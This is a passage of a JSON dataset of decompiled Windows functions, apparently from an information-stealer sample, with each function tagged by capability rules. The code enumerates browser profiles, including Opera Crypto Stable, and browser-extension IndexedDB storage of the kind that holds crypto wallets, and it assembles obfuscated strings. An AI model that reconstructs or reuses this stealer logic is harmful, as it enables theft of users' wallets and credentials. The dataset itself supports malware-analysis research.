}\n            iVar2 = (**0x457438)(iVar1, &var_950h);\n        } while (iVar2 != 0);\n        (**0x4573a8)(iVar1);\n    }\n    fcn.0042d636(unaff_ESI);\n    return;\n}\n",
        "token_count": 1009
    },
    "0041d810": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d810(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_EDX;\n    uint unaff_EDI;\n    uint var_588h;\n    uint var_584h;\n    uint var_57ch;\n    uint var_578h;\n    uint var_574h;\n    int32_t var_570h;\n    int32_t var_56ch;\n    uint var_568h;\n    uint var_53ch;\n    uint var_428h;\n    uint var_320h;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_574h = arg_8h;\n    var_578h = arg_ch;\n    var_56ch = in_EDX;\n    (**0x457374)(&var_428h, \"%s\\\\*\", arg_8h);\n    var_570h = (**0x4575e0)(&var_428h, &var_568h);\n    if (var_570h != -1) {\n        do {\n            *(in_EDX + 0x1c) = *(in_EDX + 0x1c) + 1;\n            iVar1 = (**0x457550)(&var_53ch, 0x44eba0);\n            if ((iVar1 != 0) && (iVar1 = (**0x457550)(&var_53ch, 0x44eba4),  iVar1 != 0)) {\n                fcn.00434d30(&var_320h, 0, 0x104);\n                fcn.00434d30(&var_110h, 0, 0x104);\n                (**0x457520)(&var_320h, arg_8h);\n                (**0x457520)(&var_320h, 0x44c8cc);\n                (**0x457520)(&var_320h, &var_53ch);\n                (**0x457520)(&var_110h, 0x44c8cc);\n                uVar3 = *0x45724c;\n                if (arg_10h != 0) {\n                    uVar3 = *0x456b54;\n                }\n                (**0x457520)(&var_110h, uVar3);\n                (**0x457520)(&var_110h, 0x44c8cc);\n                (**0x457520)(&var_110h);\n                (**0x457520)(&var_110h, 0x44c8cc);\n                (**0x457520)(&var_110h, var_578h);\n                (**0x457520)(&var_110h, 0x44c8cc);\n                (**0x457520)(&var_110h, var_57ch);\n                if (arg_14h == 1) {\n                    (**0x457520)(&var_110h, 0x44c8cc);\n                    uVar3 = *0x457088;\ncode_r0x0041da14:\n                    (**0x457520)(&var_110h, uVar3);\n                }\n                else {\n                    if (arg_14h == 2) {\n                        (**0x457520)(&var_110h, 0x44c8cc);\n                        uVar3 = *0x456ee8;\n                        goto code_r0x0041da14;\n                    }\n                    if (arg_14h == 3) {\n                        (**0x457520)(&var_110h, 0x44c8cc);\n                        uVar3 = *0x456b98;\n                        goto code_r0x0041da14;\n                    }\n                }\n                (**0x457520)(&var_110h, 0x44c8cc);\n                (**0x457520)(&var_110h, &var_53ch);\n                fcn.00434d30(&var_218h, 0, 0x104);\n                (**0x457520)(&var_218h, *0x457098);\n                puVar2 = fcn.0042d6d0(0x1a);\n                *puVar2 = 0;\n                uVar3 = (**0x45758c)();\n                fcn.0042f3d4(uVar3);\n                iVar1 = 0x1a;\n                do {\n                    iVar4 = fcn.0042f3e6();\n                    (**0x457374)(puVar2, 0x44fa74, puVar2, iVar4 % 10);\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n                puVar2[0x1a] = 0;\n                (**0x457520)(&var_218h, puVar2);\n                (**0x4573c8)(&var_320h, &var_218h, 1);\n                iVar1 = (**0x4573b4)(&var_218h, 0x80000000, 3, 0, 3, 0x80, 0);\n                if (iVar1 == -1) {\n                    uVar3 = 0;\n                    uVar5 = 0;\n                }\n                else {\n                    iVar4 = (**0x45736c)(iVar1, &var_588h);\n                    if (iVar4 == 0) {\n                        (**0x4573b8)();\n                        uVar3 = 0;\n                        uVar5 = 0;\n                    }\n                    else {\n                        (**0x4573b8)(iVar1);\n                        uVar3 = var_588h;\n                        uVar5 = var_584h;\n                    }\n                }\n                iVar1 = fcn.00436c90(uVar3, uVar5, 1000, 0);\n                *0x4572f4 = *0x4572f4 + iVar1;\n                iVar1 = (**0x457550)();\n                if (iVar1 == 0) {\n                    *0x4572e0 = *0x4572e0 + 1;\n                }\n                iVar1 = (**0x457550)();\n                if (iVar1 == 0) {\n                    *0x4572e0 = *0x4572e0 + 1;\n                }\n                if (*(var_56ch + 0x20) == NULL) {\n                    *0x457814 = 0x10000;\n                }\n                else if (**(var_56ch + 0x20) == 2) {\n                    *0x457814 = fcn.0042bf30(&var_110h, 0, 2);\n                }\n                else {\n                    *0x457814 = 0x80000;\n                }\n                (**0x457424)(&var_218h);\n                arg_8h = var_574h;\n                in_EDX = var_56ch;\n            }\n            iVar1 = (**0x457438)(var_570h, &var_568h);\n        } while (iVar1 != 0);\n        (**0x4573a8)(var_570h);\n    }\n    fcn.0042d636(unaff_EDI);\n    return;\n}\n",
        "token_count": 1640
    },
    "0041dc20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041dc20(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint in_EDX;\n    uint *arg_8h_00;\n    char *pcVar4;\n    uint *arg_8h_01;\n    uint var_998h;\n    uint var_994h;\n    uint var_990h;\n    uint var_98ch;\n    uint var_988h;\n    uint var_95ch;\n    uint var_848h;\n    uint var_740h;\n    uint var_638h;\n    uint var_530h;\n    uint var_428h;\n    uint var_320h;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    (**0x457374)(&var_848h, \"%s\\\\*.*\");\n    if (arg_10h == 0) {\n        arg_8h_01 = &var_988h;\n        arg_8h_00 = &var_848h;\n        iVar1 = (**0x4575e0)();\n        if (iVar1 != -1) {\n            do {\n                iVar2 = (**0x457550)(&var_95ch, 0x44eba0);\n                if (iVar2 != 0) {\n                    iVar2 = (**0x457550)(&var_95ch, 0x44eba4);\n                    if (iVar2 != 0) {\n                        fcn.00434d30(&var_110h, 0, 0x104);\n                        (**0x457520)(&var_110h, &var_95ch);\n                        (**0x457374)(&var_638h, \"%s\\\\%s\\\\%s\\\\%s\");\n                        (**0x457374)(&var_428h, \"%s\\\\%s\", &var_638h, *0x456a9c);\n                        (**0x457374)(&var_218h, \"%s\\\\%s\\\\%s\\\\%s\");\n                        (**0x457374)(&var_530h, \"%s\\\\%s\", &var_218h, *0x456a9c);\n                        (**0x457374)(&var_320h, \"%s\\\\%s\\\\%s\\\\chrome-extension_%s_0.indexeddb.leveldb\");\n                        (**0x457374)(&var_740h, \"%s\\\\%s\", &var_320h, *0x456a9c);\n                        if (arg_14h != 0) {\n                            uVar3 = (**0x457470)(&var_428h);\n                            if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n                                fcn.0041d810(&var_638h, in_EDX, arg_ch, 1);\n                            }\n                        }\n                        if (arg_18h != 0) {\n                            uVar3 = (**0x457470)(&var_530h);\n                            if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n                                fcn.0041d810(&var_218h, in_EDX, arg_ch, 2);\n                            }\n                        }\n                        if (arg_1ch != 0) {\n                            uVar3 = (**0x457470)(&var_740h);\n                            if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n                                fcn.0041d810(&var_320h, in_EDX, arg_ch, 3);\n                            }\n                        }\n                        fcn.00434d30(&var_638h, 0, 0x104);\n                        fcn.00434d30(&var_428h, 0, 0x104);\n                        fcn.00434d30(&var_218h, 0, 0x104);\n                        fcn.00434d30(&var_530h, 0, 0x104);\n                        fcn.00434d30(&var_320h, 0, 0x104);\n                        fcn.00434d30(&var_740h, 0, 0x104);\n                    }\n                }\n                iVar2 = (**0x457438)(iVar1, &var_988h);\n            } while (iVar2 != 0);\n            (**0x4573a8)(iVar1);\n            fcn.0042d636(arg_8h_00);\n            return;\n        }\n        goto code_r0x0041e135;\n    }\n    fcn.00434d30(&var_110h, 0, 0x104);\n    if (arg_10h == 1) {\n        pcVar4 = \"Opera Stable\";\ncode_r0x0041df8e:\n        (**0x457520)(&var_110h, pcVar4);\n    }\n    else {\n        if (arg_10h == 2) {\n            pcVar4 = \"Opera GX Stable\";\n            goto code_r0x0041df8e;\n        }\n        if (arg_10h == 3) {\n            pcVar4 = \"Opera Crypto Stable\";\n            goto code_r0x0041df8e;\n        }\n    }\n    (**0x457374)(&var_740h, \"%s\\\\%s\\\\%s\\\\%s\");\n    (**0x457374)(&var_320h, \"%s\\\\%s\", &var_740h, *0x456a9c);\n    (**0x457374)(&var_530h, \"%s\\\\%s\\\\%s\\\\%s\");\n    arg_8h_01 = *0x456a9c;\n    (**0x457374)(&var_218h, \"%s\\\\%s\", &var_530h);\n    (**0x457374)(&var_428h, \"%s\\\\%s\\\\%s\\\\chrome-extension_%s_0.indexeddb.leveldb\");\n    (**0x457374)(&var_638h, \"%s\\\\%s\", &var_428h, *0x456a9c);\n    if (arg_14h != 0) {\n        uVar3 = (**0x457470)(&var_320h);\n        if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n            fcn.0041d810(&var_740h, in_EDX, arg_ch, 1);\n        }\n    }\n    if (arg_18h != 0) {\n        uVar3 = (**0x457470)(&var_218h);\n        if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n            fcn.0041d810(&var_530h, in_EDX, arg_ch, 2);\n        }\n    }\n    if (arg_1ch != 0) {\n        uVar3 = (**0x457470)(&var_638h);\n        if ((uVar3 != 0xffffffff) && ((uVar3 & 0x10) == 0)) {\n            fcn.0041d810(&var_428h, in_EDX, arg_ch, 3);\n        }\n    }\ncode_r0x0041e135:\n    fcn.0042d636(arg_8h_01);\n    return;\n}\n",
        "token_count": 1695
    },
    "0041f100": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041f100(void)\n\n{\n    uint *puVar1;\n    uint unaff_EBP;\n    uint var_138ch;\n    uint uStackY68;\n    uint *puStackY64;\n    uint uStackY60;\n    uint *puStackY56;\n    char *pcStackY52;\n    uint *puStackY48;\n    uint *puStackY44;\n    uint *puStackY40;\n    uint *puStackY36;\n    uint *puStackY32;\n    uint *puStackY28;\n    uint *puStackY24;\n    char *pcStackY20;\n    uint *puStackY16;\n    uint uStackY12;\n    uint var_4h;\n    \n    var_4h = 0x41f10d;\n    fcn.0043c480();\n    puVar1 = *0x457098;\n    if (*0x457098 != NULL) {\n        uStackY12 = 0xffff;\n        puStackY16 = 0x458030;\n        pcStackY20 = \"PATH\";\n        puStackY24 = 0x41f13b;\n        (**0x4573f0)();\n        puStackY24 = 0x1388;\n        puStackY32 = &fcn.0041f100::var_138ch;\n        puStackY28 = NULL;\n        puStackY36 = 0x41f14e;\n        fcn.00434d30();\n        puStackY24 = 0x458030;\n        puStackY28 = &fcn.0041f100::var_138ch;\n        puStackY32 = 0x41f163;\n        (**0x457520)();\n        puStackY32 = 0x44eb74;\n        puStackY36 = &fcn.0041f100::var_138ch;\n        puStackY40 = 0x41f175;\n        (**0x457520)();\n        puStackY40 = puVar1;\n        puStackY44 = &fcn.0041f100::var_138ch;\n        puStackY48 = 0x41f183;\n        (**0x457520)();\n        puStackY48 = &fcn.0041f100::var_138ch;\n        pcStackY52 = \"PATH\";\n        puStackY56 = 0x41f195;\n        (**0x4573ac)();\n        puStackY56 = 0x1388;\n        puStackY64 = &fcn.0041f100::var_138ch;\n        uStackY60 = 0;\n        uStackY68 = 0x41f1a8;\n        fcn.00434d30();\n        puStackY56 = *0x457194;\n        uStackY60 = 0x41f1b7;\n        *0x45733c = (**0x457514)();\n        if (*0x45733c != NULL) {\n            uStackY12 = *0x456d18;\n            pcStackY20 = 0x41f1d2;\n            puStackY16 = *0x45733c;\n            *0x457330 = (**0x457474)();\n            pcStackY20 = *0x4570f8;\n            puStackY24 = *0x45733c;\n            puStackY28 = 0x41f1ea;\n            *0x45734c = (**0x457474)();\n            puStackY28 = *0x456c14;\n            puStackY32 = *0x45733c;\n            puStackY36 = 0x41f203;\n            *0x4572fc = (**0x457474)();\n            puStackY36 = *0x456b4c;\n            puStackY40 = *0x45733c;\n            puStackY44 = 0x41f21b;\n            *0x457324 = (**0x457474)();\n            puStackY44 = *0x4572ac;\n            puStackY48 = *0x45733c;\n            pcStackY52 = 0x41f233;\n            *0x457340 = (**0x457474)();\n            pcStackY52 = *0x456dc0;\n            puStackY56 = *0x45733c;\n            uStackY60 = 0x41f24c;\n            *0x45731c = (**0x457474)();\n        }\n        if ((((*0x457330 != 0) && (*0x45734c != 0)) && (*0x4572fc != 0)) &&\n           (((*0x457340 != 0 && (*0x45731c != 0)) && (*0x457324 != 0)))) {\n            var_4h = 0x41f297;\n            fcn.0042d636(unaff_EBP);\n            return;\n        }\n    }\n    var_4h = 0x41f2a8;\n    fcn.0042d636(unaff_EBP);\n    return;\n}\n",
        "token_count": 1109
    },
    "0041f580": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041f580(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t noname_30;\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    char *arg_8h_00;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint32_t uStack101904;\n    uint32_t uStack101896;\n    uint uStack101880;\n    uint32_t uStack101876;\n    uint32_t uStack101868;\n    uint uStack101852;\n    uint32_t uStack101848;\n    uint32_t uStack101840;\n    uint uStack101824;\n    uint32_t uStack101820;\n    uchar auStack101812 [100000];\n    uint var_710h;\n    uint var_328h;\n    uint var_220h;\n    uint uStack540;\n    uint *puStack536;\n    uint uStack532;\n    uint *puStack528;\n    uint uStack524;\n    uint *puStack520;\n    char32_t *pcStack516;\n    uint *puStack512;\n    char32_t *pcStack508;\n    uint *puStack504;\n    char32_t *pcStack500;\n    uint *puStack496;\n    char32_t *pcStack492;\n    uint *puStack488;\n    char32_t *pcStack484;\n    uint *puStack480;\n    char32_t *pcStack476;\n    uint *puStack472;\n    char32_t *pcStack468;\n    uint *puStack464;\n    char32_t *pcStack460;\n    uint *puStack456;\n    char32_t *pcStack452;\n    uint *puStack448;\n    char32_t *pcStack444;\n    uint *puStack440;\n    char32_t *pcStack436;\n    uint *puStack432;\n    char32_t *pcStack428;\n    uint *puStack424;\n    char32_t *pcStack420;\n    uint *puStack416;\n    char32_t *pcStack412;\n    uint *puStack408;\n    char32_t *pcStack404;\n    uint *puStack400;\n    uint uStack396;\n    uint *puStack392;\n    uint uStack388;\n    uint *puStack384;\n    uint uStack380;\n    uint *puStack376;\n    uint uStack372;\n    uint *puStack368;\n    char32_t *pcStack364;\n    uint *puStack360;\n    uint uStack356;\n    uint *puStack352;\n    char32_t *pcStack348;\n    uint *puStack344;\n    uint uStack340;\n    uint *puStack336;\n    char32_t *pcStack332;\n    uint *puStack328;\n    uint uStack324;\n    uint *puStack320;\n    char32_t *pcStack316;\n    uint *puStack312;\n    char32_t *pcStack308;\n    uint *puStack304;\n    uint uStack300;\n    uint *puStack296;\n    char32_t *pcStack292;\n    uint *puStack288;\n    uint var_118h;\n    uint *puStack280;\n    uint uStack276;\n    uint *puStack272;\n    char32_t *pcStack268;\n    uint *puStack264;\n    uint uStack260;\n    uint *puStack256;\n    char32_t *pcStack252;\n    uint *puStack248;\n    uint uStack244;\n    uint *puStack240;\n    char32_t *pcStack236;\n    uint *puStack232;\n    char32_t *pcStack228;\n    uint *puStack224;\n    uint uStack220;\n    uint *puStack216;\n    uint uStack212;\n    uint *puStack208;\n    uint uStack204;\n    uint *puStack200;\n    char32_t *pcStack196;\n    uint *puStack192;\n    uint uStack188;\n    uint *puStack184;\n    uint32_t uStack180;\n    uint uStack176;\n    char32_t *noname_2;\n    uint noname_3;\n    uint noname_4;\n    uint noname_5;\n    uint noname_6;\n    uint noname_7;\n    uint noname_8;\n    uint noname_9;\n    uint noname_10;\n    uint noname_11;\n    uint noname_12;\n    uint noname_13;\n    uint noname_14;\n    uint noname_15;\n    uint noname_16;\n    uint noname_17;\n    uint noname_18;\n    char *noname_19;\n    char *noname_20;\n    uint noname_21;\n    char *noname_22;\n    uint noname_23;\n    uint noname_24;\n    char *noname_25;\n    uint noname_26;\n    uint noname_27;\n    uchar *arg_8h_01;\n    uchar *arg_8h_02;\n    uint var_10h;\n    uint32_t var_ch;\n    uint noname_35;\n    uint var_4h;\n    \n    noname_35 = 0x443938;\n    var_ch = *in_FS_OFFSET;\n    fcn.0043c480();\n    noname_30 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0041f580::var_ch;\n    fcn.00434d30();\n    *(arg_8h_00 + 0xc) = 0;\n    *(arg_8h_00 + 0x10) = 0;\n    *(arg_8h_00 + 8) = 0;\n    *(arg_8h_00 + 0x18) = 0;\n    *(arg_8h_00 + 0x14) = 0;\n    *(arg_8h_00 + 0x1c) = 0;\n    fcn.0041f480(arg_8h, arg_ch);\n    arg_8h_02 = &stack0xfffe724c;\n    fcn.0041f2b0(arg_8h_02);\n    arg_8h_01 = &stack0xfffe724c;\n    fcn.0041f2b0(arg_8h_01);\n    noname_27 = 0;\n    noname_25 = arg_8h_00;\n    noname_26 = *0x4570a0;\n    fcn.0041ed40(arg_8h_00, *0x4570a0, 0);\n    noname_24 = 0;\n    noname_22 = arg_8h_00;\n    noname_23 = *0x456b00;\n    fcn.0041ed40(arg_8h_00, *0x456b00, 0);\n    noname_21 = 1;\n    noname_20 = \"Opera Crypto Stable\";\n    noname_19 = arg_8h_00;\n    fcn.0041ed40(arg_8h_00, \"Opera Crypto Stable\", 1);\n    noname_18 = *0x456eb4;\n    fcn.0041ea70(*0x456eb4);\n    noname_17 = *0x456c4c;\n    fcn.0041ea70(*0x456c4c);\n    noname_16 = *0x456fd0;\n    fcn.0041ea70(*0x456fd0);\n    noname_15 = *0x456eb8;\n    fcn.0041ea70(*0x456eb8);\n    noname_14 = *0x456ee0;\n    fcn.0041ea70(*0x456ee0);\n    noname_13 = *0x4571bc;\n    fcn.0041ea70(*0x4571bc);\n    noname_12 = *0x4570e4;\n    fcn.0041ea70(*0x4570e4);\n    noname_11 = *0x456ab8;\n    fcn.0041ea70(*0x456ab8);\n    noname_10 = *0x456e7c;\n    fcn.0041ea70(*0x456e7c);\n    noname_9 = *0x456be8;\n    fcn.0041ea70(*0x456be8);\n    noname_8 = *0x456e70;\n    fcn.0041ea70(*0x456e70);\n    noname_7 = *0x4571f0;\n    fcn.0041ea70(*0x4571f0);\n    noname_6 = *0x456b14;\n    fcn.0041ea70(*0x456b14);\n    noname_5 = *0x4572bc;\n    fcn.0041ea70(*0x4572bc);\n    noname_4 = *0x456ba4;\n    fcn.0041ea70(*0x456ba4);\n    noname_3 = *0x45718c;\n    fcn.0041ea70(*0x45718c);\n    noname_2 = *0x456b30;\n    fcn.0041ea70(*0x456b30);\n    uVar3 = *0x456d14;\n    fcn.0041ea70(*0x456d14);\n    if (*arg_8h_00 != '\\0') {\n        fcn.0041be70(arg_8h_00, uVar3, noname_2, noname_3, noname_4, noname_5, noname_6, noname_7, noname_8, noname_9, \n                     noname_10, noname_11, noname_12, noname_13, noname_14, noname_15, noname_16, noname_17, noname_18, \n                     noname_19, noname_20, noname_21, noname_22, noname_23, noname_24, noname_25, noname_26, noname_27, \n                     arg_8h_01, arg_8h_02, noname_30, unaff_EDI, unaff_ESI, unaff_EBX, var_ch, noname_35, 0xffffffff, \n                     unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, in_stack_00000010, in_stack_00000014, \n                     in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, \n                     in_stack_0000002c, in_stack_00000030, in_stack_00000034, in_stack_00000038);\n        if (*arg_8h_00 != '\\0') {\n            fcn.0041d1e0();\n            fcn.0041f2b0(&stack0xfffe724c);\n            fcn.0041b360();\n        }\n    }\n    if (arg_8h_00[5] != '\\0') {\n        fcn.00434d30();\n        fcn.00434d30();\n        fcn.00434d30();\n        fcn.00434d30();\n        uStack176 = 0;\n        uStack180 = 0x41f8c5;\n        iVar1 = (**0x457500)();\n        puStack184 = &fcn.0041f580::var_118h;\n        uStack180 = &fcn.0041f580::var_710h & (iVar1 < 0) - 1;\n        uStack188 = 0x41f8e3;\n        (**0x457520)();\n        uStack188 = 0x44c8cc;\n        puStack192 = &fcn.0041f580::var_118h;\n        pcStack196 = 0x41f8f5;\n        (**0x457520)();\n        pcStack196 = L\"TgmDkyd87F35E\";\n        puStack200 = &fcn.0041f580::var_118h;\n        uStack204 = 0x41f907;\n        (**0x457520)();\n        uStack204 = 0x44ede8;\n        puStack208 = &fcn.0041f580::var_118h;\n        uStack212 = 0x41f919;\n        (**0x457520)();\n        uStack212 = 0x44ede4;\n        puStack216 = &fcn.0041f580::var_118h;\n        uStack220 = 0x41f92b;\n        (**0x457520)();\n        uStack220 = 0x44ede8;\n        puStack224 = &fcn.0041f580::var_118h;\n        pcStack228 = 0x41f93d;\n        (**0x457520)();\n        pcStack228 = L\"gmDkyd87F35E\";\n        puStack232 = &fcn.0041f580::var_118h;\n        pcStack236 = 0x41f94f;\n        (**0x457520)();\n        pcStack236 = L\"rofi\";\n        puStack240 = &fcn.0041f580::var_118h;\n        uStack244 = 0x41f961;\n        (**0x457520)();\n        uStack244 = 0x44ede0;\n        puStack248 = &fcn.0041f580::var_118h;\n        pcStack252 = 0x41f973;\n        (**0x457520)();\n        pcStack252 = L\"mDkyd87F35E\";\n        puStack256 = &fcn.0041f580::var_118h;\n        uStack260 = 0x41f985;\n        (**0x457520)();\n        uStack260 = 0x44f028;\n        puStack264 = &fcn.0041f580::var_118h;\n        pcStack268 = 0x41f997;\n        (**0x457520)();\n        pcStack268 = L\"Dkyd87F35E\";\n        puStack272 = &fcn.0041f580::var_118h;\n        uStack276 = 0x41f9a9;\n        (**0x457520)();\n        uStack276 = 0x44ede8;\n        puStack280 = &fcn.0041f580::var_118h;\n        var_118h = 0x41f9bb;\n        (**0x457520)();\n        var_118h = 0x44edf0;\n        puStack288 = &fcn.0041f580::var_118h;\n        pcStack292 = 0x41f9cd;\n        (**0x457520)();\n        pcStack292 = L\"kyd87F35E\";\n        puStack296 = &fcn.0041f580::var_118h;\n        uStack300 = 0x41f9df;\n        (**0x457520)();\n        uStack300 = 0x44edec;\n        puStack304 = &fcn.0041f580::var_118h;\n        pcStack308 = 0x41f9f1;\n        (**0x457520)();\n        pcStack308 = L\"ofi\";\n        puStack312 = &fcn.0041f580::var_118h;\n        pcStack316 = 0x41fa03;\n        (**0x457520)();\n        pcStack316 = L\"profi\";\n        puStack320 = &fcn.0041f580::var_118h;\n        uStack324 = 0x41fa15;\n        (**0x457520)();\n        uStack324 = 0x44c8cc;\n        puStack328 = &fcn.0041f580::var_118h;\n        pcStack332 = 0x41fa27;\n        (**0x457520)();\n        pcStack332 = L\"kyd87F35E\";\n        puStack336 = &fcn.0041f580::var_328h;\n        uStack340 = 0x41fa39;\n        (**0x457520)();\n        uStack340 = 0x44ede8;\n        puStack344 = &fcn.0041f580::var_328h;\n        pcStack348 = 0x41fa4b;\n        (**0x457520)();\n        pcStack348 = L\"yd87F35E\";\n        puStack352 = &fcn.0041f580::var_328h;\n        uStack356 = 0x41fa5d;\n        (**0x457520)();\n        uStack356 = 0x44efd8;\n        puStack360 = &fcn.0041f580::var_328h;\n        pcStack364 = 0x41fa6f;\n        (**0x457520)();\n        pcStack364 = L\"d87F35E\";\n        puStack368 = &fcn.0041f580::var_328h;\n        uStack372 = 0x41fa81;\n        (**0x457520)();\n        uStack372 = 0x44ede0;\n        puStack376 = &fcn.0041f580::var_328h;\n        uStack380 = 0x41fa93;\n        (**0x457520)();\n        uStack380 = 0x44edec;\n        puStack384 = &fcn.0041f580::var_328h;\n        uStack388 = 0x41faa5;\n        (**0x457520)();\n        uStack388 = 0x44ede0;\n        puStack392 = &fcn.0041f580::var_328h;\n        uStack396 = 0x41fab7;\n        (**0x457520)();\n        uStack396 = 0x44edf0;\n        puStack400 = &fcn.0041f580::var_328h;\n        pcStack404 = 0x41fac9;\n        (**0x457520)();\n        pcStack404 = L\"Dkyd87F35E\";\n        puStack408 = &fcn.0041f580::var_220h;\n        pcStack412 = 0x41fadb;\n        (**0x457520)();\n        pcStack412 = L\"87F35E\";\n        puStack416 = &fcn.0041f580::var_220h;\n        pcStack420 = 0x41faed;\n        (**0x457520)();\n        pcStack420 = L\"7F35E\";\n        puStack424 = &fcn.0041f580::var_220h;\n        pcStack428 = 0x41faff;\n        (**0x457520)();\n        pcStack428 = L\"7F35E\";\n        puStack432 = &fcn.0041f580::var_220h;\n        pcStack436 = 0x41fb11;\n        (**0x457520)();\n        pcStack436 = L\"F35E\";\n        puStack440 = &fcn.0041f580::var_220h;\n        pcStack444 = 0x41fb23;\n        (**0x457520)();\n        pcStack444 = L\"7F35E\";\n        puStack448 = &fcn.0041f580::var_220h;\n        pcStack452 = 0x41fb35;\n        (**0x457520)();\n        pcStack452 = L\"87F35E\";\n        puStack456 = &fcn.0041f580::var_220h;\n        pcStack460 = 0x41fb47;\n        (**0x457520)();\n        pcStack460 = L\"35E\";\n        puStack464 = &fcn.0041f580::var_220h;\n        pcStack468 = 0x41fb59;\n        (**0x457520)();\n        pcStack468 = L\"Dkyd87F35E\";\n        puStack472 = &fcn.0041f580::var_220h;\n        pcStack476 = 0x41fb6b;\n        (**0x457520)();\n        pcStack476 = L\"5E\";\n        puStack480 = &fcn.0041f580::var_220h;\n        pcStack484 = 0x41fb7d;\n        (**0x457520)();\n        pcStack484 = L\"Dkyd87F35E\";\n        puStack488 = &fcn.0041f580::var_220h;\n        pcStack492 = 0x41fb8f;\n        (**0x457520)();\n        pcStack492 = L\"35E\";\n        puStack496 = &fcn.0041f580::var_220h;\n        pcStack500 = 0x41fba1;\n        (**0x457520)();\n        pcStack500 = L\"E\";\n        puStack504 = &fcn.0041f580::var_220h;\n        pcStack508 = 0x41fbb3;\n        (**0x457520)();\n        pcStack508 = L\"F35E\";\n        puStack512 = &fcn.0041f580::var_220h;\n        pcStack516 = 0x41fbc5;\n        (**0x457520)();\n        pcStack516 = L\"87F35E\";\n        puStack520 = &fcn.0041f580::var_220h;\n        uStack524 = 0x41fbd7;\n        (**0x457520)();\n        uStack524 = 0x44ef34;\n        puStack528 = &fcn.0041f580::var_220h;\n        uStack532 = 0x41fbe9;\n        (**0x457520)();\n        uStack532 = 0x44ef30;\n        puStack536 = &fcn.0041f580::var_220h;\n        uStack540 = 0x41fbfb;\n        (**0x457520)();\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, &fcn.0041f580::var_328h, 0x44f5f8);\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, &fcn.0041f580::var_220h, 0x44f5f8);\n        uStack101820 = 0xf;\n        uStack101824 = 0;\n        uStack101840 = uStack101840 & 0xffffff00;\n        fcn.004090e0(0x44f604, 2);\n        puVar2 = fcn.00409750(&stack0xfffe7230);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, puVar2, 0x44f5f8);\n        if (0xf < uStack101848) {\n            fcn.0042d62b();\n        }\n        uStack101848 = 0xf;\n        uStack101852 = 0;\n        uStack101868 = uStack101868 & 0xffffff00;\n        if (0xf < uStack101820) {\n            fcn.0042d62b();\n        }\n        uStack101820 = 0xf;\n        uStack101824 = 0;\n        uStack101840 = uStack101840 & 0xffffff00;\n        fcn.004090e0(\"BC10B77*\", 8);\n        puVar2 = fcn.00409750(&stack0xfffe7230);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        var_ch = 0x41fd5f;\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, puVar2, 0x44f5f8);\n        if (0xf < uStack101848) {\n            var_ch = uStack101868;\n            fcn.0042d62b();\n        }\n        uStack101848 = 0xf;\n        uStack101852 = 0;\n        uStack101868 = uStack101868 & 0xffffff00;\n        if (0xf < uStack101820) {\n            var_ch = uStack101840;\n            fcn.0042d62b();\n        }\n        var_ch = 